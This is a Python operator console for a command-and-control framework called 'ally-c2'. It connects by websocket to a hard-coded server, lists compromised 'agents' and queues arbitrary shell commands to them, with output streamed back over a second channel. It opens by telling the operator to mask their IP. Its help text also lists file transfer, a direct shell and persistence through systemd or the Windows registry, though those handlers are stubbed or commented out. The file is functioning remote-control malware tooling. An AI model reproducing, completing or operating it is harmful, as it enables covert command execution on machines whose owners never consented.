from os import sendfile
from re import ASCII
import readline #for semi shell interaction in input()
import asyncio
import json
import websockets

from prompt_toolkit import PromptSession, print_formatted_text
from prompt_toolkit.formatted_text import ANSI
from prompt_toolkit.patch_stdout import patch_stdout

#-----
#### colors for printing #####
RESET = "\033[0m"
RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
BOLD = "\033[1m"
PURPLE = "\033[38;2;128;0;255m"
BLUE = "\033[34m"

def banner():
    print(f"""{PURPLE}

                                                                                                      
         .8.          8 8888         8 8888  `8.`8888.      ,8'              ,o888888o.     88 88
        .888.         8 8888         8 8888   `8.`8888.    ,8'              8888     `88.   88 88 
       :88888.        8 8888         8 8888    `8.`8888.  ,8'            ,8 8888       `8.  88 88
      . `88888.       8 8888         8 8888     `8.`8888.,8'             88 8888            88 88
     .8. `88888.      8 8888         8 8888      `8.`88888'              88 8888            88 88
    .8`8. `88888.     8 8888         8 8888       `8. 8888               88 8888            88 88
   .8' `8. `88888.    8 8888         8 8888        `8 8888               88 8888            88 88
  .8'   `8. `88888.   8 8888         8 8888         8 8888               `8 8888       .8'  88 88
 .888888888. `88888.  8 8888         8 8888         8 8888                  8888     ,88'   88 88
.8'       `8. `88888. 8 888888888888 8 888888888888 8 8888                   `8888888P'     88 88


    {RESET}""")

def warning():
    banner()
    print(f"{BOLD}{RED}[!] warning [!]{RESET}\n")
    print("REMEMBER to take precaution and mask your ip\n")

    while True:
        con = input("do you want to continue[y/n] ").lower()
        if con == "y" or con == "n":
            break

    if con == "y":
        return True

    return False


    

def all_actions(actions):
    if actions == "main":
        print(f"""
    normal prompt
    - help
    - clear
    - build
        ip||url /port/ windows||linux

    - list-agents 
    - use <agent id>

              """)

    if actions == "use":
        print(f"""
    anget use
    - back
        back to server mode
    - help
    - clear

    - sh <shell cmd>
    - upload <mypath> <agentpath>
    - download  <agentpath> <mypath>

    - dir-sh
        direct shell via ws [{RED}can lower your OPSEC{RESET}]

    - percistance 
        systemd, windows reg
        
              """)
    

def clear():
    print_formatted_text(ANSI("\033[2J\033[H" ))
def command_not_fount():
    print_formatted_text(ANSI(f"-- [{RED}-{RESET}] command not found"))
#-----




async def useMode_wsCom(websocket, action, agent_id, data):
    # task queue
    payload = {
        "action": "queue_task",
        "agent_id": agent_id,
        "data": data
    }
    
    await websocket.send(json.dumps(payload))
    response_raw = await websocket.recv()
    response = json.loads(response_raw)
    
    print_formatted_text(ANSI(f"\n[Server Response] :\n{response.get('output')}\n"))

async def event_listener(event_url):
    try:
        print(f"\n[DEBUG] connect to channer events: {event_url}")
        async with websockets.connect(event_url) as ws:
            print(f"[DEBUG] channel connected waiting for data")
            while True:
                response_raw = await ws.recv()
                print(f"[DEBUG] Ricevuto dal server eventi: {response_raw}")
                
                response = json.loads(response_raw)
                if response.get("type") == "agent_output":
                    msg = f"\n{GREEN}[*] Output da agent[{response.get('agent_id')}]:{RESET}\n{response.get('output')}\n"
                    print_formatted_text(ANSI(msg))
                    
    except websockets.exceptions.ConnectionClosed as e:
        print(f"\n{RED}[-] WebSocket closed form server: {e}{RESET}")
    except Exception as e:
        print(f"\n{RED}[-] ctical error in event_listener: {e}{RESET}")




async def use_agent(websocket, agent_id, session):

    with patch_stdout():
        while True:
            shell_cmd = await session.prompt_async(ANSI(f"{BOLD}{PURPLE}agent{RESET}{BOLD}[{agent_id}]{RESET}[ally-c2] > "))
            shell_cmd= shell_cmd.strip().lower()

            if not shell_cmd:
                continue

            parts = shell_cmd.split()
            action = parts[0]
            
            if action == "back":
                print_formatted_text(ANSI(f"\n{BLUE}[*]{RESET} exit use mode\n"))
                return
            elif action == "help":
                all_actions("use")
                continue
            elif action == "clear":
                clear()
                continue

            elif action == "sh":
                if len(parts) < 2:
                    print_formatted_text(ANSI(f"[{RED}-{RESET}] Error: specify command (es. sh ls)"))
                    continue
                
                sh_cmd = " ".join(parts[1:])
                
                payload = {
                    "action": "queue_task",
                    "agent_id": agent_id,
                    "data": sh_cmd
                }
                await websocket.send(json.dumps(payload))
                _ = await websocket.recv()
                
                print_formatted_text(ANSI(f"\n{BLUE}[*] Task queued. Output will arrive via background stream.{RESET}\n"))
                continue

            # elif action == "download":
            #
            #     await useMode_wsCom(websocket,action,agent_id)
            #     continue
            #
            # elif action == "upload":
            #     await useMode_wsCom(websocket,action,agent_id)
            #     continue
            #
            # elif action == "percistance":
            #     await useMode_wsCom(websocket,action,agent_id)
            #     continue

            else:
                command_not_fount()




async def main(server_url, event_url):
    if not warning():
        return

    print(f"\n\n{BOLD}welcome{RESET} to the ally-cII pannel use {BOLD}/help{RESET} to view")
    print(f"all the possible actions\n")

    session = PromptSession()

    try: 
        async with websockets.connect(server_url) as websocket:
            asyncio.create_task(event_listener(event_url)) 

            with patch_stdout():
                while True:
                    cmd = await session.prompt_async(ANSI(f"{BOLD}{RED}server{RESET}[ally-c2] > "))
                    cmd = cmd.strip().lower()

                    if not cmd:
                        continue
                    parts = cmd.lower().split()
                    action = parts[0]


                    if action == "help":
                        all_actions("main")
                        continue
                    elif action == "clear":
                        clear()
                        continue
                    elif action == "build":
                        print("working on")
                        continue




                    elif action == "list-agents":
                        payload = {"action": "list_agents"}
                        await websocket.send(json.dumps(payload))
                        response = json.loads(await websocket.recv())
                        print(f"\nActive Agents:\n\n{response.get('agents')}\n")
                        continue

                    elif action == "use":
                        if len(parts) < 2:
                            print_formatted_text(ANSI(f"[{RED}-{RESET}] Error: you have to specify the Agent id (es. use 123)"))
                            continue
                        
                        agent_id = parts[1]
                        print_formatted_text(ANSI(f"\n{BLUE}[*]{RESET} Entered agent session: {agent_id}\n"))
                        
                        await use_agent(websocket, agent_id, session) 
                        continue
                    

                    else:
                        command_not_fount()










    except websockets.exceptions.ConnectionClosed:
        print("[-] Connection closed form server.")
    except Exception as e:
        print(f"[-] Error of connection: {e}")


if __name__ == "__main__":

    server_url = "ws://192.168.1.172:8080/ws/operator"
    events_url= "ws://192.168.1.172:8080/ws/events"

    try:
        asyncio.run(main(server_url,events_url))
    except KeyboardInterrupt:
        print(f"\n[{RED}*{RESET}] forced exit form ally-c2 CLI-CLIENT.")




